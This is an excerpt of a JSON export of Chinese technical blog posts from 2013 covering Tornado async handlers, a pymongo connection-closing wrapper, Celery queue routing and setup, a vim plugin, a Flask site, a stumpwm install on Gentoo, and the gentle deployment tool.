--loglevel=info\n```\n\n但是这里的问题也可能很严重:我们的异步非阻塞依赖于celery,还是这个队列的长度,假如任务很多那么就需要等待,效率很低.有没有一种办法把我的同步阻塞函数变为异步(或者说被tornado的装饰器理解和识别)呢?\n\n```python\n#!/bin/env python\n\nimport tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nimport tornado.httpclient\nimport tornado.gen\nfrom tornado.concurrent import run_on_executor\n# 这个并发库在python3自带在python2需要安装sudo pip install futures\nfrom concurrent.futures import ThreadPoolExecutor\n\nimport time\n\nfrom tornado.options import define, options\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass SleepHandler(tornado.web.RequestHandler):\n    executor = ThreadPoolExecutor(2)\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self):\n        # 假如你执行的异步会返回值被继续调用可以这样(只是为了演示),否则直接yield就行\n        res = yield self.sleep()\n        self.write(\"when i sleep\")\n        self.finish()\n\n    @run_on_executor\n    def sleep(self):\n        time.sleep(5)\n        return 5\n\nclass JustNowHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"i hope just now see you\")\n\nif __name__ == \"__main__\":\n    tornado.options.parse_command_line()\n    app = tornado.web.Application(handlers=[\n            (r\"/sleep\", SleepHandler), (r\"/justnow\", JustNowHandler)])\n    http_server = tornado.httpserver.HTTPServer(app)\n    http_server.listen(options.port)\n    tornado.ioloop.IOLoop.instance().start()\n```\n\n但是有朋友留言和我说为什么在浏览器打开多个url请求还是会阻塞一个个的响应呢?\n\n这个事浏览器自身实现的可能是缓存把,当请求的资源相同就会出现这个问题,可以使用多浏览器(多人)或者命令行下的curl登都不会有这个问题,还有个比较恶的解决方法:\n\n给你的请求添加一些无用参数，比如: http://localhost:8000/sleep/?a=1 也可以是个时间戳\n\n##### 2014.4.1更新,发现了2种新的写法,请参照[Blocking tasks in Tornado](http://lbolla.info/blog/2013/01/22/blocking-tornado)\n\n```python\nfrom concurrent.futures import ThreadPoolExecutor\nfrom functools import partial, wraps\nimport time\n\nimport tornado.ioloop\nimport tornado.web\n\nfrom tornado.options import define, options\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nEXECUTOR = ThreadPoolExecutor(max_workers=4)\n\n\ndef unblock(f):\n\n    @tornado.web.asynchronous\n    @wraps(f)\n    def wrapper(*args, **kwargs):\n        self = args[0]\n\n        def callback(future):\n            self.write(future.result())\n            self.finish()\n\n        EXECUTOR.submit(\n            partial(f, *args, **kwargs)\n        ).add_done_callback(\n            lambda future: tornado.ioloop.IOLoop.instance().add_callback(\n                partial(callback, future)))\n\n    return wrapper\n\n\nclass JustNowHandler(tornado.web.RequestHandler):\n\n    def get(self):\n        self.write(\"i hope just now see you\")\n\n\nclass SleepHandler(tornado.web.RequestHandler):\n\n    @unblock\n    def get(self, n):\n        time.sleep(float(n))\n        return \"Awake! %s\" % time.time()\n\n\nclass SleepAsyncHandler(tornado.web.RequestHandler):\n\n    @tornado.web.asynchronous\n    def get(self, n):\n\n        def callback(future):\n            self.write(future.result())\n            self.finish()\n\n        EXECUTOR.submit(\n            partial(self.get_, n)\n        ).add_done_callback(\n            lambda future: tornado.ioloop.IOLoop.instance().add_callback(\n                partial(callback, future)))\n\n    def get_(self, n):\n        time.sleep(float(n))\n        return \"Awake! %s\" % time.time()\n\n\napplication = tornado.web.Application([\n    (r\"/justnow\", JustNowHandler),\n    (r\"/sleep/(\\d+)\", SleepHandler),\n    (r\"/sleep_async/(\\d+)\", SleepAsyncHandler),\n])\n\n\nif __name__ == \"__main__\":\n   application.listen(options.port)\n   tornado.ioloop.IOLoop.instance().start()\n```\n",
    "date": {
      "year": "2013",
      "month": "August",
      "day": "14"
    }
  },
  {
    "id": 280,
    "title": "封装pymongo自动关闭连接",
    "category": "pymongo",
    "tags": [
      "pymongo"
    ],
    "url": "/archives/feng-zhuang-pymongozi-dong-guan-bi-lian-jie/",
    "content": "####前言\n\n在我工作的项目里面使用了mongodb.自然也用到了pymongo.但是它都是在大片的函数里面使用类似于这样的方式\n\n```python\nimport db\ndef test():\n    ...\n    db.test.find_one()\n    ...\n```\n\n但是问题是在使用完都没有关闭连接,这样多台服务器连接我这台mongodb服务器，在业务高峰期就会占满我的连接, 我当时总结造成这个原因的问题有以下三种:\n\n1. 上面说的用完db不关闭连接而是等着db超时\n\n1. 注意上面的import，其实在import文件的时候数据库连接就已经生成了，没有在需要的时候才创建, 占满我连接的应用其实有很多没有用，浪费了\n\n1. nginx、uwsgi，celery等应用配置的问题，造成过多的实例，其实根本无益\n\n####我今天写的一个封装pymongo和关闭数据库连接的装饰器\n\n```python\n#/usr/bin/env python\n# coding=utf-8\n\n\"\"\"\n1. 封装数据库操作(INSERT,FIND,UPDATE)\n2. 函数执行完MONGODB操作后关闭数据库连接\n\"\"\"\n\nfrom functools import wraps\nfrom pymongo.database import Database\n\ntry:\n    from pymongo import MongoClient\nexcept ImportError:\n    # 好像2.4之前的pymongo都没有MongoClient,现在官网已经把Connection抛弃了\n    import warnings\n    warnings.warn(\"Strongly recommend upgrading to the latest version pymongo version,\"\n                  \"Connection is DEPRECATED: Please use mongo_client instead.\")\n    from pymongo import Connection as MongoClient\n\n\nclass Mongo(object):\n\n    '''封装数据库操作'''\n\n    def __init__(self, host='localhost', port=27017, database='test',\n                 max_pool_size=10, timeout=10):\n        self.host = host\n        self.port = port\n        self.max_pool_size = max_pool_size\n        self.timeout = timeout\n        self.database = database\n\n    @property\n    def connect(self):\n        # 我这里是为了使用类似\"db.集合.操作\"的操作的时候才会生成数据库连接,其实pymongo已经实现了进程池,也可以把这个db放在__init__里面,\n        # 比如我把db关掉有其他的数据库调用连接又会生成,并且不影响使用.我这里只是想每次执行数据库生成一个连接用完关掉-自己控制自己的\n        return MongoClientself.host, self.port, max_pool_size=self.max_pool_size,\n                  connectTimeoutMS=60 * 60 * self.timeout)\n\n    def __getitem__(self, collection):\n        # 为了兼容db[集合].操作的用法\n        return self.__getattr__(collection)\n\n    def __getattr__(self, collection_or_func):\n        db = self.connect[self.database]\n        if collection_or_func in Database.__dict__:\n            # 当调用的是db的方法就直接返回\n            return getattr(db, collection_or_func)\n        # 否则委派给Collection\n        return Collection(db, collection_or_func)\n\n\nclass Collection(object):\n\n    def __init__(self, db, collection):\n        self.collection = getattr(db, collection)\n\n    def __getattr__(self, operation):\n        # 我这个封装只是为了拦截一部分操作,不符合的就直接raise属性错误\n        control_type = ['disconnect', 'insert', 'update', 'find', 'find_one']\n        if operation in control_type:\n            return getattr(self.collection, operation)\n        raise AttributeError(operation)\n\n\ndef close_db(dbs=['db']):\n    '''\n    关闭mongodb数据库连接\n    db : 在执行函数里面使用的db的名字(大部分是db，也会有s_db)\n        Usage::\n            >>>s_db = Mongo()\n            >>>@close_db(['s_db'])\n            ...: def test():\n            ...:     print s_db.test.insert({'a': 1, 'b': 2})\n            ...:\n    '''\n    def _deco(func):\n        @wraps(func)\n        def _call(*args, **kwargs):\n            result = func(*args, **kwargs)\n            for db in dbs:\n                try:\n                    func.func_globals[db].connection.disconnect()\n                except KeyError:\n                    pass\n            return result\n        return _call\n    return _deco\n```\n\nPS: 在我测试的时候发现,使用Mongo()类生成的db，操作完会自动关闭连接了...\n\n####怎么样给一个很大的文件每个函数都加上面的这个装饰器？\n\n项目每个脚本的代码都很长，函数也很多，并且每个函数里面使用的db的名字都不同,比如有一些一些风格:\n\n\n```python\ndb.test.find_one()\ns_db.test.insert(dict(test='test'))\n...\n```\n\n每个函数加一个装饰器,好费劲，就想能不能自动分辨文件中的函数然后给他们自动加装饰器，然后就有以下的一个做好的脚本:\n\n```python\n#coding=utf-8\n\nfrom functools import wraps\nimport copy\nimport types\n\ndef wrap(func):\n    @wraps(func)\n    def _call(*args, **kwargs):\n        result = func(*args, **kwargs)\n        print 'wrap you'\n        return result\n    return _call\n\ndef test():\n    print 'test'\n\ndef test2():\n    print 'test3'\n\nglocal_dict = copy.copy(globals())\n\nfunc_list = [[k, v] for k, v in glocal_dict.iteritems() if not k.startswith('__')]\n\nfor func_name, func in func_list:\n    if  func_name in ['wraps', 'copy', 'wrap', 'types']:\n        continue\n    if types.FunctionType  == type(func):\n        globals()[func_name]= wrap(func)\n```\n\n这样当你调用的时候自动就有了装饰器:\n\n```bash\n>>> from test import test\n>>> test()\ntest\nwrap you\n>>>\n```\n",
    "date": {
      "year": "2013",
      "month": "August",
      "day": "16"
    }
  },
  {
    "id": 281,
    "title": "使用celery之深入celery配置",
    "category": "celery",
    "tags": [
      "celery",
      "topic",
      "direct",
      "fanout"
    ],
    "url": "/archives/shi-yong-celeryzhi-shen-ru-celerypei-zhi/",
    "content": "####前言\n\ncelery的官方文档其实相对还是写的很不错的.但是在一些深层次的使用上面却显得杂乱甚至就没有某些方面的介绍, 通过我的一个测试环境的settings.py来说明一些使用celery的技巧和解决办法\n\n####amqp交换类型\n\n其实一共有4种交换类型，还有默认类型和自定义类型. 但是对我们配置队列只会用到其中之三，我来一个个说明，英语好的话可以直接去看英文文档\n\n首先思考一下流程:\n\n1. celerybeat生成任务消息，然后发送消息到一个exchange(交换机)\n\n1. 交换机决定那个(些)队列会接收这个消息，这个其实就是根据下面的exchange的类型和绑定到这个交换机所用的bindingkey\n\n我们这里要说的其实就是怎么样决定第二步谁接收的问题\n\n1. Direct Exchange\n\n如其名，直接交换，也就是指定一个消息被那个队列接收， 这个消息被celerybeat定义个一个routing key，如果你发送给交换机并且那个队列绑定的bindingkey 那么就会直接转给这个队列\n\n2. Topic Exchange\n\n你设想一下这样的环境(我举例个小型的应该用场景): 你有三个队列和三个消息, A消息可能希望被X,Y处理,B消息你希望被,X,Z处理,C消息你希望被Y,Z处理.并且这个不是队列的不同而是消息希望被相关的队列都去执行,看一张图可能更好理解:\n\n![](https://access.redhat.com/site/documentation/resources/docs/en-US/Red_Hat_Enterprise_MRG/1.1/html/Messaging_User_Guide/images/topic-exchange.png)\n\n对，Topic可以根据同类的属性进程通配, 你只需要routing key有'.'分割:比如上图中的usa.news, usa.weather, europe.news, europe.weather\n\n3. Fanout Exchange\n\n先想一下广播的概念, 在设想你有某个任务，相当耗费时间，但是却要求很高的实时性,那么你可以需要多台服务器的多个workers一起工作，每个服务器负担其中的一部分,但是celerybeat只会生成一个任务,被某个worker取走就没了,\n所以你需要让每个服务器的队列都要收到这个消息.这里很需要注意的是:你的fanout类型的消息在生成的时候为多份,每个队列一份，而不是一个消息发送给单一队列的次数\n\n####我的settings.py\n\n这里只是相关于celery的部分:\n\n```python\nimport djcelery\ndjcelery.setup_loader()\n\nINSTALLED_APPS = (\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.sites',\n    #'django.contrib.staticfiles',\n    'django.contrib.messages',\n    # Uncomment the next line to enable the admin:\n    'django.contrib.admin',\n    'django.contrib.staticfiles',\n    # Uncomment the next line to enable admin documentation:\n    # 'django.contrib.admindocs',\n    'dongwm.smhome',\n    'dongwm.apply',\n    'djcelery', # 这里增加了djcelery 也就是为了在django admin里面可一直接配置和查看celery\n    'django_extensions',\n    'djsupervisor',\n    'django.contrib.humanize',\n    'django_jenkins'\n)\n\nBROKER_URL = 'amqp://username:password@localhost:5672/yourvhost'\n\nCELERY_IMPORTS = (\n    'dongwm.smhome.tasks',\n    'dongwm.smdata.tasks',\n)\n\nCELERY_RESULT_BACKEND = \"amqp\" # 官网优化的地方也推荐使用c的librabbitmq\nCELERY_TASK_RESULT_EXPIRES = 1200 # celery任务执行结果的超时时间，我的任务都不需要返回结果,只需要正确执行就行\nCELERYD_CONCURRENCY = 50 # celery worker的并发数 也是命令行-c指定的数目,事实上实践发现并不是worker也多越好,保证任务不堆积,加上一定新增任务的预留就可以\nCELERYD_PREFETCH_MULTIPLIER = 4 # celery worker 每次去rabbitmq取任务的数量，我这里预取了4个慢慢执行,因为任务有长有短没有预取太多\nCELERYD_MAX_TASKS_PER_CHILD = 40 # 每个worker执行了多少任务就会死掉，我建议数量可以大一些，比如200\nCELERYBEAT_SCHEDULER = 'djcelery.schedulers.DatabaseScheduler' # 这是使用了django-celery默认的数据库调度模型,任务执行周期都被存在你指定的orm数据库中\nCELERY_DEFAULT_QUEUE = \"default_dongwm\" # 默认的队列，如果一个消息不符合其他的队列就会放在默认队列里面\n\nCELERY_QUEUES = {\n    \"default_dongwm\": { # 这是上面指定的默认队列\n        \"exchange\": \"default_dongwm\",\n        \"exchange_type\": \"direct\",\n        \"routing_key\": \"default_dongwm\"\n    },\n    \"topicqueue\": { # 这是一个topic队列 凡是topictest开头的routing key都会被放到这个队列\n        \"routing_key\": \"topictest.#\",\n        \"exchange\": \"topic_exchange\",\n        \"exchange_type\": \"topic\",\n    },\n    \"test2\": { # test和test2是2个fanout队列,注意他们的exchange相同\n        \"exchange\": \"broadcast_tasks\",\n        \"exchange_type\": \"fanout\",\n        \"binding_key\": \"broadcast_tasks\",\n    },\n    \"test\": {\n        \"exchange\": \"broadcast_tasks\",\n        \"exchange_type\": \"fanout\",\n        \"binding_key\": \"broadcast_tasks2\",\n    },\n}\n\nclass MyRouter(object):\n\n    def route_for_task(self, task, args=None, kwargs=None):\n\n        if task.startswith('topictest'):\n            return {\n                'queue': 'topicqueue',\n            }\n        # 我的dongwm.tasks文件里面有2个任务都是test开头\n        elif task.startswith('dongwm.tasks.test'):\n            return {\n                \"exchange\": \"broadcast_tasks\",\n            }\n        # 剩下的其实就会被放到默认队列\n        else:\n            return None\n\n# CELERY_ROUTES本来也可以用一个大的含有多个字典的字典,但是不如直接对它做一个名称统配\nCELERY_ROUTES = (MyRouter(), )\n```\n\n\n\n",
    "date": {
      "year": "2013",
      "month": "August",
      "day": "24"
    }
  },
  {
    "id": 282,
    "title": "vary.vim-自动去掉行尾空格",
    "category": "vim",
    "tags": [
      "vary.vim"
    ],
    "url": "/archives/vary-dot-vim-zi-dong-qu-diao-xing-wei-kong-ge/",
    "content": "####前言\n\n一直想改成emacs无奈工作需要效率，所以vim还没有完全放弃. 我想做python的同学很可能有我一样的困扰:\n\n1. 在维护别人的代码的时候发现有很多tab和空格混用或者行尾空格没有删除\n\n我以前可能没有注意这个问题，就是自觉的使用ed模式: :%s/\\s\\+$//g和:retab，最近老大的一句话提醒\n了我:他问我是否vim可以配置成自动模式? 以我对vim的了解它肯定不会介入个人的编辑,那么可能就要使用hook的方法.\n\n这也就是我的[vary.vim](https://github.com/dongweiming/vary.vim)的原理:当保存文件的时候(:w)自动执行命令.\n其实我想你可能会问，为啥是我保存的时候而不是打开的时候呢?额 下面会讲到\n\n####安装配置请看项目的README\n\n安装后就算不配置默认只对python语言生效-团队和语言风格不同\n\n\n####修改我的vim插件\n\n我一直在想究竟哪种方式更合理(打开文件就修改还是保存的时候再修改),我默认是保存，但是其实你可以修改我的autocmd命令为:\n\n```bash\nautocmd BufReadPost * :call StripTrailingWhite()\nautocmd BufReadPost * :call RetabIndents()\n```\n\n表示打开文件之前就修改，把修改后的结果呈现给你\n",
    "date": {
      "year": "2013",
      "month": "September",
      "day": "08"
    }
  },
  {
    "id": 283,
    "title": "一个flask+mongoengine的site",
    "category": "flask",
    "tags": [
      "flask",
      "mongoengine",
      "jquery",
      "d3",
      "pure",
      "amcharts",
      "toastr"
    ],
    "url": "/archives/a-data-analysis-site-by-flask-and-mongoengine/",
    "content": "####前言\n\n最近一直学习emacs和elisp, 也在做关于mongodb相关的研究,闲来无事就做了个网站,后端使用了flask, mongoengine, 前端css框架用的是\n雅虎的[pure](https://github.com/yui/pure), 还是用了神奇的[grunt](https://github.com/gruntjs/grunt)做页面修改的livereload, 然后有d3,\njquery, amchart和一个最近发现的页面消息弹出[toastr](https://github.com/CodeSeven/toastr).想学习flask和mongoengine的童鞋可直接拿去,开源地址是\n[data-analysis](https://github.com/dongweiming/data-analysis)\n\n####下载依赖和启动\n\n```python\ncd /path/to/data-analysis\npip install -r requirements.txt\n# 安装grunt\nnpm install\n# 我的后端样例数据\nmongorestore -d fetch_data --directoryperdb dump/fetch_data\ncd data_analysis\n# 启动Grunt\ngrunt\n# 启动\npython run.py\n# 然后打开 http://Youip:5000\n```\n",
    "date": {
      "year": "2013",
      "month": "November",
      "day": "20"
    }
  },
  {
    "id": 284,
    "title": "使用celery之怎么让celery跑起来",
    "category": "celery",
    "tags": [
      "celery"
    ],
    "url": "/archives/how-to-use-celery/",
    "content": "####前言\n\n自从发了上次的文章[使用celery之深入celery配置](http://www.dongwm.com/archives/shi-yong-celeryzhi-shen-ru-celerypei-zhi/),\n有一些网友再问我怎么让celery跑起来. 其实说来也是,celery在新手眼里真的是比较重量级,不好懂,今天先让他跑起来吧\n本文大部分代码和使用方法都可以在celery官网看到\n\n####我想要的效果\n\n我想实现一个定时任务, 每3个小时的12分启动,假如是定时任务大概是这样的:\n\n```\n12 */3 * * * python /where/is/the/path/that.py\n```\n\n####选择MQ\n\n使用消息队列其实就是为了给任务一个时序,保证任务消息不丢失,想想你的一个任务是关乎公司核心业务,犹豫某种原因失败或者丢失怎么办?\ncelery就需要这个消息的存储,我这里还是选择rabbitmq  mongodb,redis都无所谓 只是存储的位置的问题.\n选择其他的工具没有远程控制和监控\n\n写法就是:\n\n```\nBROKER_URL = 'amqp://myuser:mypassword@localhost:5672/vhost'\n```\n\n其中可以这样解析\n\n```\namqp://user:password@hostname:port/vhost\n```\n\nvhost是命名空间,就像网站的子域名,在这里由于权限控制我们需要先创建账号和密码\n\n```\n$ rabbitmqctl add_user myuser mypassword\n$ rabbitmqctl add_vhost myvhost\n$ rabbitmqctl set_permissions -p myvhost myuser \".*\" \".*\" \".*\"\n```\n\n#### 编写tasks.py脚本\n\n```\nfrom celery import Celery\n\napp = Celery('tasks', broker='amqp://myuser:mypassword@localhost:5672/vhost')\n\n@app.task\ndef add(x, y):\n    return x + y\n```\n#### 简单的使用\n\n```\n$celery -A tasks worker --loglevel=debug\n```\n\n-A指定的就是任务的程序 tasks.py  worker表示他是一个执行任务角色. 后面的记录日志类型,默认是info\n\n这个时候,你可以在当前目录下使用python交互模式生成一个任务\n\n```\n>>> from tasks import add\n>>> add.delay(4, 4)\n```\n\n这个时候可以看见上面的日志里面多了一些消息,然后里面多了这个任务的信息,比如下面这样:\n\n```\n[2013-11-24 17:11:59,369: INFO/MainProcess] Received task: tasks.add[f27994b0-3628-43a1-b136-540a360e3d64]\n[2013-11-24 17:11:59,371: INFO/MainProcess] Task tasks.add[f27994b0-3628-43a1-b136-540a360e3d64] succeeded in 0.00102571400021s: 8\n```\n\n可以看见你的任务被执行了\n\n#### 假如我使用python的包, 就像一个应用,让代码结构化一些\n\n```\n$tree proj\nproj\n├── __init__.py\n├── celery.py\n└── tasks.py\n```\n\n```\n$cat proj/celery.py\nfrom __future__ import absolute_import\nfrom celery import Celery\napp = Celery('proj',\n              broker='amqp://myuser:mypassword@localhost:5672/vhost',\n              backend='amqp://',\n              include=['proj.tasks'])\napp.conf.update(CELERY_TASK_RESULT_EXPIRES=3600,)\nif __name__ == '__main__':\n    app.start()\n```\n\n上面的broker就是消息存储的地址\nbackend是存储任务执行情况的,比如正在执行，执行失败, 已经执行结果.\ninclude表示执行的任务的代码都放在哪个程序里面,比如这里的proj.tasks就是proj/tasks.py\n\n```\n$cat proj/tasks.py\nfrom __future__ import absolute_import\n\nfrom proj.celery import app\n\n\n@app.task\ndef add(x, y):\n    return x + y\n```\n\n其中的app.task是一个装饰器, 你可以在tasks.py里面加很多函数,但是celery只会找带这个装饰器的函数当成一种任务去执行\n你可以有多个这样的脚本,只要在上面的celery.py的include的列表中指定\n\n好吧 我们可以这样启动\n\n```\n$celery worker --app=proj -l info\n```\n\nproj 就是我们刚才应用的项目目录\n\n#### 给我们的项目任务放到特定的队列\n\n可能你有很多的任务,但是你希望某些机器跑某些任务, 你可以希望有些任务优先级比较高,而不希望\n先进先出的等待. 那么需要引入一个队列的问题. 也就是说在你的broker的消息存储里面有一些队列，他们并行运行，但是worker只从对应\n的队列里面取任务.\n\n我们要修改配置\n\n```\n$cat proj/celery.py\nfrom __future__ import absolute_import\nfrom celery import Celery\napp = Celery('proj',\n              broker='amqp://myuser:mypassword@localhost:5672/vhost',\n              backend='amqp://',\n              include=['proj.tasks'])\napp.conf.update(\n    CELERY_ROUTES = {\n            'proj.tasks.add': {'queue': 'hipri'},\n                },\n                )\nif __name__ == '__main__':\n    app.start()\n```\n\n```\ncelery -A proj worker -Q hipri #这个worker只处理hipri这个队列的任务\n```\n\n你会发现add这个函数任务被放在一个叫做'hipri'的队列里面，想要执行那么也需要改:\n\n```\nfrom proj.tasks import add\nadd.apply_async((2, 2), queue='hipri')\n```\n\n#### 使用beat自动调度\n\n想想吧. 目前还是交互模式去手动执行, 我们要是想crontab的定时生成和执行,那么就是celery beat干的事情\n\n```\nfrom __future__ import absolute_import\n\nfrom datetime import timedelta\nfrom celery import Celery\n\napp = Celery('proj',\n             broker='amqp://myuser:mypassword@localhost:5672/vhost',\n             backend='amqp://',\n              include=['proj.tasks'])\n\napp.conf.update(\n    CELERY_ROUTES = {\n        'proj.tasks.add': {'queue': 'hipri'},\n    },\n\n    CELERYBEAT_SCHEDULE = {\n        \"add\": {\n                \"task\": \"proj.tasks.add\",\n                \"schedule\": timedelta(seconds=10),\n                \"args\": (16, 16)\n                }, },\n                )\n\nif __name__ == '__main__':\n    app.start()\n\n```\n\n注意发现了一个CELERYBEAT_SCHEDULE,里面的调度其实就是表示10秒生成一次,worker启动方法一样,\n这里启动beat,他就是按时生成任务发到MQ里面,让worker取走去执行\n\n```\ncelery -A proj beat\n```\n\n其实也可以在worker命令中加-B\n\n```\ncelery -A proj worker -B -Q hipri -l debug\n```\n\n刚才的CELERYBEAT_SCHEDULE也可以使用crontab的风格，比如我说的没3小时的12分就可以这样:\n\n```\nfrom celery.schedules import crontab\n\nCELERYBEAT_SCHEDULE = {\n        \"add\": {\n                \"task\": \"tasks.add\",\n                \"schedule\": crontab(hour=\"*/3\", minute=12),\n                \"args\": (16, 16),\n                },\n            }\n```\n",
    "date": {
      "year": "2013",
      "month": "November",
      "day": "24"
    }
  },
  {
    "id": 285,
    "title": "gentoo使用stumpwm做桌面管理器",
    "category": "stumpwm",
    "tags": [
      "stumpwm"
    ],
    "url": "/archives/gentoo-use-stumpwm/",
    "content": "####前言\n\n以前一直使用gentoo+gnome的方法使用,说实话,gentoo做个人桌面是在很一般, 尤其是跑起来\nfirefox, 虽然依然性能要比其他linux桌面发行版要好,可是我自己清楚.\n尤其是gnome的很多功能对我个人完全没有用处,还浪费了内存. 最近神奇的同事@刘喆告诉我原来还有个神奇的\n[stumpwm](git://github.com/sabetts/stumpwm.git), 基于common lisp的桌面管理.\n我想很多人听过awesome,但是是lua的版本. 我当然希望用我熟悉的语言.这是一篇安装配置过程的博客\n\n####安装遇到了一些问题\n\n本来一般的软件都是包管理emerge stumpwm 就好啦,但是我安装后依然找不到stumpwm,\n在手动编译stumpwm的过程发现很多奇葩报错. 所以连sbcl也编译了一个\n\n\n#### 安装过程\n\n```python\n# 安装sbcl到/usr/local\nwget http://downloads.sourceforge.net/project/sbcl/sbcl/1.1.13/sbcl-1.1.13-source.tar.bz2\ntar jxvf sbcl-1.1.13-source.tar.bz2\ncd sbcl-1.1.13\nsh make.sh\nunset SBCL_HOME\nunset INSTALL_ROOT\nsudo sh install.sh\n\n#使用commonlisp的包管理工具quicklisp.lisp\n\ncurl -O http://beta.quicklisp.org/quicklisp.lisp\nsbcl --load quicklisp.lisp\n(quicklisp-quickstart:install)\n(ql:add-to-init-file)\n# 还需要以下2个依赖\n(ql:quickload \"clx\")\n(ql:quickload \"cl-ppcre\")\n\n# 可选安装swank\n(ql:quickload \"swank\")\n(ql:quickload \"quicklisp-slime-helper\")\n\n# 退出\n(quit)\n\n# 下载stumpwm\n\ngit clone git://git.savannah.nongnu.org/stumpwm.git\ncd stumpwm && ./autogen.sh && ./configure && make\nPS: 这个make时候就算报错,也没有太大关系\n\n#生成2进制文件 再次进入sbcl交互模式\n\n(asdf:oos 'asdf:load-op :stumpwm)\n(sb-ext:save-lisp-and-die \"stumpwm\" :executable t\n    :toplevel #'(lambda () (stumpwm:stumpwm \":0\")))\n\n# 拷贝文件到PATH\n\nsudo cp -rp stumpwm /usr/bin/\n\n# 设置启动 注意是你的普通用户\n\n$ echo \"exec stumpwm\" >> ~/.xinitrc\n\n# 这样你就可以使用startx启动啦\n\nstumpwm的命令都是ctrl+t 开头的\n```\n",
    "date": {
      "year": "2013",
      "month": "November",
      "day": "25"
    }
  },
  {
    "id": 286,
    "title": "gentle - 帮助你快速部署代码到测试环境",
    "category": "gentle",
    "tags": [
      "gentle",
      "fabric",
      "docopt"
    ],
    "url": "/archives/gentle-quickly-submit-code-to-the-test-environment-tools/",
    "content": "####前言\n\n我想很多开发的同学都经历过这样的开发流程:\n\n- 本地修改代码\n- 把代码推到测试环境\n- 重启测试环境需要的服务\n- 本地看效果,改bug重复1-3\n- 功能稳定后上线\n\n这个过程有什问题呢?\n\n- 假设你是一个做过运维或者能力很强的人,比如我这种,本地跑测试环境,但是假如一个新人,或者对测试环境中的某些\n部分不是很了解的人, 甚至需要和生产环境完全一样的条件下, 本地可能就不好使了. 那么这需要一个测试服务器\n\n- 首先你每次修改代码, push ,重启环境都需要你登陆测试环境,至少不够自动化.然后退回本地看效果,这个过程有点浪费时间和经理\n- 其次是你可能有好几个项目,他们之间可能都没什么共通点. 你需要多个测试环境\n- 当然你可以写几个脚本,为你每个测试环境写一个东西去自动化这些，未尝不可. 只是需要重复造很多轮子\n- 假如为了安全有跳板机,你需要登陆跳板机才能跳到你的测试服务器,你可能要写很复杂的expect脚本\n\n然后是我认为最重要的:\n\n**凡是屁大点事就放个deamon的运维都是耍流氓, 就拿小屁几台服务器还搞神马salt, ansible之类的事情,真是太无聊了.**\n\n这些东西帮助你做了很多事情,但是会让你变得更懒.而且重要的是-它们写的并不一定只符合你的需要或者就不符合你的需要. 我喜欢简单粗暴的实现,最近在看[fabric](https://github.com/fabric/fabric)的代码, 作为做过op,也给[salt](https://github.com/saltstack/salt)贡献过代码的我,写了这个东西: [gentle](https://github.com/dongweiming/gentle), 帮助我自动化提交代码到我的测试环境. 这个东西是我认为符合我需要，或者大部分开发同学需要的小东西,基于fabric, [docopt](https://github.com/docopt/docopt) 和yaml.\n\n\n####我的工作的一些特点\n\n我负责几个项目, 它们有以下特点\n\n- 项目在不同的机房, 有完整的测试环境和相关数据\n- 项目依赖的服务基本不同,比如有的使用了supervisor, 有的是程序fork后退出了父进程;有的使用了nginx+uwsgi,有的就是nginx+服务等.\n- 项目之间需要的依赖应用不同,且启动顺序有区别. 这个很好理解, 启动需要先启动A,再启动B,才能启动C\n- 项目有的需要登陆跳板机\n\n####我以前的个人的开发习惯和流程\n\n- 我有一个专门的存放服务配置的目录, 后缀是ip或者项目的名字. git版本库, 每次更新后上传到测试环境\n- 我有专门的op PATH, 做了很多alias, 都是一些python或者shell的脚本,用来同步测试环境,登陆测试环境撑起服务的脚本\n\n看起来以前用的也不错. 但是gentle能怎么样提高呢?\n\n####gentle的开发流程\n\n- 切换到你要开发的目录\n- 初始化这个目录,其实就是在当前目录增加一个.gentle.yaml\n- 根据你的需要配置测试环境账号ip密码, 想要同步的目录, 需要重启的服务和优先级已经命令\n- 以后每次只需在这个目录下,使用`gt publish` 或者更懒 `gt p`, 他就会帮你自动rsync然后重启相关服务.\n\n具体使用可以去我的github或者[readthedocs.org](http://gentle.readthedocs.org/en/latest/)\n\n####安装和依赖\n\n我已经放到了pypi, 你可以使用pip或者easy_install\n\n```python\nsudo pip install gentle\n```\n\n这样在系统环境下会有一个`gt`命令\n\nfabric有2个对于项目更新的函数,一个是rsync_project,一个是upload_project, upload是把项目压缩在服务器上解压缩,实际上很浪费时间,但是rsync_project不能使用env.password,需要手动输入一次密码,都很不爽,我找到一个解决办法就是`sshpass`, 帮助自动输入rsync的密码, 我也给fabric提了PR. 我的项目使用了我个人的改进版的rsync_project\n\n如果你是ubuntu 直接:\n\n```\nsudo apt-get install sshpass\n```\n\n其他操作系统可以在这里下载 http://sourceforge.net/projects/sshpass/ 然后编译\n\n```\ntar zxvf sshpass-1.05.tar.gz && cd sshpass-1.05 && ./configure &&\nmake && sudo make install\n```\n\n####一个我的测试环境的例子, 我加注释说明\n\n```python\nhost: 192.168.3.11 #测试服务器, 格式是user@host:port\npassword: dongwmspassword #登录服务器需要的密码\ngateway: #可以不存在,中间服务器,格式是user@host:port\ngatewaypassword: #中间服务器(jump跳板机)的密码\nrsync: #这个操作是rsync\n  lpath: $ROOT #你可以使用全路径, $ROOT表示当前路径,本地目录\n  rpath: /opt/tornado # 测试环境的目录\nservices: # 每个段落就是一个服务,这里有nginx和supervisor\n  nginx:\n    command: kill -9 `ps -ef |grep nginx|grep -v grep|awk '{print $2}'` && /opt/nginx/sbin/nginx #启动的命令\n    lpath: /usr/local/etc/nginx/nginx.conf #nginx.conf的本地地址\n    priority: 1 #优先级越高越先执行\n    rpath: /opt/nginx/conf/nginx.conf #测试环境的nginx.conf路径\n    sudo: false # 因为这个环境很宽松 不需要sudo\n    user: #sudo使用的用户,默认是登陆的用户\n  supervisor:\n    command: supervisorctl -c /etc/supervisor/supervisord.conf reload\n    lpath: /Users/dongwm/settings/supervisord.conf.31\n    priority: 2\n    rpath: /etc/supervisor/supervisord.conf\n    sudo: false\n    user:\nusername: root #登陆服务器的默认用户, 你可以在使用host的时候指定用户\n```\n\n####欢迎给我issue和PR\n\n####TODO\n\n- 因为很多人会用到跳板机,我想加入跳板机的用法, 看起来就像直接在本地操作远程一样 # 更新2013-12-03 完成\n- 设置输出是否隐藏,目前保留就是为了让我看到执行的过程\n- 